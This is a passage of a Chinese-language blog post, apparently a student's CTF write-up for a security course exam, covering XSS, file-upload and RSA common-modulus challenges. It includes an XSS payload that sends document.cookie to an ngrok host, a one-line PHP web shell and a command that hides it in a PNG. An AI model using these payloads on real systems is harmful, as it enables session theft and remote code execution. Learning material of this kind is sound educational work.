+<p>到了這邊，我原本以為是要把合法的ID和XSS的payload結合在一起，並在Report的地方提交。但經過助教的提示之後，知道應該是要把payload提交在note的內文，所以我開始重新研究一次app.js的程式碼。發現了之前沒仔細看到可能可以注入XSS的地方，如下。</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/note/:noteId&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> noteId = req.<span class="property">params</span>.<span class="property">noteId</span>;</span><br><span class="line">    <span class="keyword">const</span> note = <span class="variable constant_">NOTES</span>.<span class="title function_">get</span>(noteId);</span><br><span class="line">    <span class="keyword">if</span> (!note) <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;Note not found!&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">`&lt;h1&gt;Your Note&lt;h1&gt;&lt;p id=&quot;note&quot;&gt;<span class="subst">$&#123;note&#125;</span>&lt;/p&gt;`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+<p>在這段程式碼中，可以看到我們提交的note會被夾在p標籤中解析，所以我嘗試注入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>發現不能執行，因為app.js裡面限制了允許的標籤白名單，只有s、b、u、p、code這五個標籤能使用，其餘的標籤會被strip掉。知道可以用的標籤後，我使用了p標籤提交，嘗試執行javascript，payload如下:</p>
+<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=<span class="title function_">alert</span>(<span class="number">1</span>)&gt;test&lt;p&gt;</span><br></pre></td></tr></table></figure></div>
+<p>發現note只會被解析成<code>test</code>，而移動滑鼠到上面的時候也確實會執行js，因此接下來要做的就是修改payload，並再提交note後去report的地方提交id，讓visit去執行到我們提交的腳本，就可以得到cookie了。</p>
+<p>我用ngrok在本地先架了個伺服器，並且嘗試透過其獲取cookie，payload如下:</p>
+<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p/onmouseover=document.location.href=&quot;https://1ffb-36-234-174-194.ngrok-free.app/&quot;+document.cookie style=&quot;position:fixed;left:0;top:0;width:9999px;height:9999px;&quot;&gt;test<span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>但是因為onmouseover屬性需要有滑鼠滑過，即便我把p標籤調整的很大，但因為visit函數不會有滑鼠滑過，所以還是不會執行。很可惜到了截止的最後，還是沒能找出正確的payload獲取到flag。</p>
+<p>最後來談談這個漏洞在真實世界可能的危害，題目在每次回報完後都會提示<code>admin will check your report</code>，這告訴我們如果真實世界中有人利用XSS漏洞注入了惡意代碼，而當系統管理員去”check”的時候，自己的cookie可能就會被利用，讓有心人士可以在不知道admin帳號密碼的情況下以admin的權限登入系統。</p>
+<h1 id="Uploader"><a href="#Uploader" class="headerlink" title="Uploader"></a>Uploader</h1><p>在這題裡面，我先嘗試上傳了一張正常的圖片，發現網頁會呈現這樣的狀態。<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ByG6mhhcT.png"
+                      alt="image"
+                ><br>我一開始先用了課程中教過的一句話木馬來嘗試上傳，我上傳的是php檔。</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>結果系統會回應<code>not a PNG file</code>，這表示前端會檢測是否為合法的上傳檔案類型，我又嘗試把檔名修改為<code>shell.php.png</code>再進行上傳，結果系統的回應是<code>Invalid image</code>，表示後端也有檢測他是否為PNG檔案。後來又嘗試了很多其他的方法，包括在php payload前面加上magic numbers <code>89504E47</code>嘗試讓系統解析為PNG檔，但得到的回應都跟前面差不多。</p>
+<p>最後，在經過一番搜尋、查找資料後，發現只剩下一個方法，就是上傳圖片馬。所謂的圖片馬，就是把圖片和木馬組合在一起上傳。於是我準備了一張正常的png(normal.png)和惡意的php代碼(shell.php)，將其放在同一個路徑底下。接著利用以下的指令將其組合為惡意圖片馬(pwn.png):</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.png/b + shell.php/a pwn.png</span><br></pre></td></tr></table></figure></div>
+<p>接著我將pwn.png上傳，發現系統回應<code>Bad content</code>，到這邊，比賽就結束了，結果最後還是沒能成功地取得Flag，QQ。</p>
+<h1 id="Common-modulus"><a href="#Common-modulus" class="headerlink" title="Common modulus"></a>Common modulus</h1><p>這題的題目給了三個e(公鑰)，三個c(密文)，還有一個n(質數因子相乘)，如果有其中兩個e是互質，也就是gcd(e1, e2) &#x3D; 1的話，就可以利用一般的共模攻擊，去求得m(明文)，就是利用會有一組s1和s2滿足s1 * e1 + s2 * e2 &#x3D; 1的條件，加上一點計算，去找出原本的m，如下。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">已知 s1 * e1 + s2 * e2 = 1</span><br><span class="line">==========================</span><br><span class="line">c1 ^ s1 * c2 ^ s2 mod n </span><br><span class="line">= m ^ (e1 * s1) * m ^ (e2 * s2) mod n </span><br><span class="line">= m ^ (e1 * s1 + e2 * s2) mod n</span><br><span class="line">= m mod n </span><br><span class="line">= m</span><br></pre></td></tr></table></figure></div>
+<p>可惜這題的三個e都不是互質的，所以要用其他的方法，我就找到了<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701" >一篇文章 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，裡面的方法是這樣:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gcd(e1, e2) = gcd</span><br><span class="line">c1 = (m ^ e1&#x27;) ^ gcd mod n</span><br><span class="line">c2 = (m ^ e2&#x27;) ^ gcd mod n</span><br><span class="line">e1&#x27; * s1 + e2&#x27; * s2 = 1</span><br><span class="line"></span><br><span class="line">c1 ^ s1 * c2 ^s2 mod n</span><br><span class="line">= (((m ^ e1&#x27;) ^ gcd) ^ s1) * (((m ^ e2&#x27;) ^ gcd) ^s2) mod n</span><br><span class="line">= m ^ (e1&#x27; * s1 * gcd + e2&#x27; * s2 * gcd) mod n</span><br><span class="line">= m ^ gcd mod n</span><br></pre></td></tr></table></figure></div>
+<p>所以只要把最後算出來的m再開gcd次方根就能找到明文，於是我寫了下面的腳本。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcdext, iroot, gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">22777210958276255973049562078823322470680917129996977683503001216538435863571279721754251786904659128777249694642787480739356668460290853226080964490087136228546045908347764486557698226166963415933243390587759408509357466384117429023536043020407223339909068182712164327318468662771341384255178839693851749833498595767285757850112681038669603653206881003854674152787778849201349140811383067441876396986225542868926178627083357794996583066978454919162611524965685485188287561894204743004599366796640463833284730895990140454443706509700257117888543581605105114423861683342316455500361042572686499019143155407840720672419</span></span><br><span class="line">e1 = <span class="number">2755481107</span></span><br><span class="line">e2 = <span class="number">3066037283</span></span><br><span class="line"><span class="comment"># e3 = 3825027809</span></span><br><span class="line">c1 = <span class="number">7927632180925780686814468716254548866073876571301670927803568567992929927231666309788681512003760545920706822481579873353923145930555620003462589361971404649174770107086295817994744475096856399932862153021335565923236506465046739212222528807145844779588311833022632475905272022533594289777471811000950934146066045472218603345107418836739010466236517799411565681939684720963118217633594133046157469386003057018852372681387318985149400851657988757739939640107583630568340335757129814894759082226790230350623403635880468479392207604875482436028050237168056669104984504520909514306552404757744266671282270481535254632231</span></span><br><span class="line">c2 = <span class="number">19162894772364755634695403163786451410245098251726628084799257554767334519905640179161346412307514221332891648206034353728374020165930677162860102377777681292582203157662333178388904577242217496599789741706061676944395451665239726479077741007297709368920091594846785681021427819585722029936761040901809601396670202192052497066209075288103228744858127970671076282164969113619499174358765991380757911727424305398346399701274033326030443722686643479760852934150701783998463047750118216160431187984416861424972003041835112849345069144579908117061092179552843173803432427193984945136248106420527309951492325647621839772126</span></span><br><span class="line"><span class="comment"># c3 = 12281989205300534636704612304895466894728582803084654071108548003638296732533233324118128443432186580642178421360358569501856887776677567285142630332770995470034693283004693504328569378601328550606731466373274474890323776647142155504550689141803732334439130044963732806927780975317712578470165550637007845813598338398021681428237912733055103663278507239375781432804708170722603762602715296180599171769475818480578806749013564273888734572033232825425951511959908980277564593244704622649568752985829748683356507419796438898916535864730103144986484287500764463579887673117770889298009984153867524175061353407719439002075</span></span><br><span class="line"></span><br><span class="line">g = gcd(e1, e2)</span><br><span class="line">e1_ = e1 // g</span><br><span class="line">e2_ = e2 // g</span><br><span class="line">l, s1, s2 = gcdext(e1_, e2_)</span><br><span class="line">m = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">m = iroot(m, g)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag = <span class="subst">&#123;long_to_bytes(m).decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>只不過最後的答案是錯誤的，沒能找到正確的flag。可能是因為本題的gcd太大，還要找其他的算法。</p>
+<h1 id="參賽心得"><a href="#參賽心得" class="headerlink" title="參賽心得"></a>參賽心得</h1><p>這次算是我第一次花了那麼多的時間打CTF比賽，之前可能就是自己在網路上解解題甚麼的，總的來說還是很有趣的一次體驗。而參加完這次的比賽，我也更加地意識到自己的不足，真的還有很多可以進步、練習的地方。即便可能有點被打擊信心，但我也不會氣餒，我要更努力的練習，沒事就多解解題甚麼的，增強自己的實力，希望可以在之後的比賽表現得越來越好！</p>
+<h1 id="參考資料區"><a href="#參考資料區" class="headerlink" title="參考資料區"></a>參考資料區</h1><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://yinwc.github.io/2020/04/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#/%E5%85%B6%E4%BB%96%E8%A7%84%E5%88%99" >文件上傳漏洞總結 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html" >PERSISTENT PHP PAYLOADS IN PNGS: HOW TO INJECT PHP CODE IN AN IMAGE – AND KEEP IT THERE ! <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10245459?sc=hot" >[Day 26] 026 - 串流加密法 - Stream cipher <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hackmd.io/@foxo-tw/slides/%2F%40foxo-tw%2FByAkemFv7%3Ftype%3Dslide%23%2F1" >童舒晧資安資源整理(XSS教學) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3952?time__1311=n4+xnD0DBDgGG=G8+eDsA3xCqm/z3K3r34D&alichlgref=https://www.google.com/" >安全工具——XSSer <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/mydriverc2/article/details/42048983?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-1-42048983-blog-113249158.235%5Ev43%5Epc_blog_bottom_relevance_base9&spm=1001.2101.3001.4242.2&utm_relevant_index=2" >XSSer使用(CSDN) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/CHUNJIUJUN/article/details/120553701" >关于RSA共模攻击e1，e2不互素的解法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40345591/article/details/127476867" >文件上传漏洞进阶教程&#x2F;白名单绕过&#x2F;图片马制作&#x2F;图片马执行 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> SCIST S4 資訊安全期末考 Writeup</li>
+        <li><strong>Author:</strong> CX330</li>
+        <li><strong>Created at
+                :</strong> 2024-05-28 13:33:42</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-06-02 17:19:39
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/05/28/SCIST-S4-資訊安全期末考-Writeup/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Security/">#Security</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/05/28/2024-Summer-Intensive-Training-Plan/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2024 Summer Intensive Training Plan</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://comment.cx330.tw',
+          lang: 'en',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: ['https://unpkg.com/@waline/emojis@1.2.0/tw-emoji'],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">SCIST S4 資訊安全期末考 Writeup</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Welcome"><span class="nav-text">Welcome</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSSER"><span class="nav-text">XSSER</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Uploader"><span class="nav-text">Uploader</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Common-modulus"><span class="nav-text">Common modulus</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%83%E8%B3%BD%E5%BF%83%E5%BE%97"><span class="nav-text">參賽心得</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%E5%8D%80"><span class="nav-text">參考資料區</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">Background image is designed by <a href="https://dribbble.com/louiscoyle" target="_blank">Louis Coyle</a></div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2024</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-code fa-flip" style="--fa-animation-duration: 5s; color:#f5a524;"></i>&nbsp;&nbsp;<a href="/">CX330</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        5 posts in total
+                    </span>
+                    
+                        <span>
+                            5k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
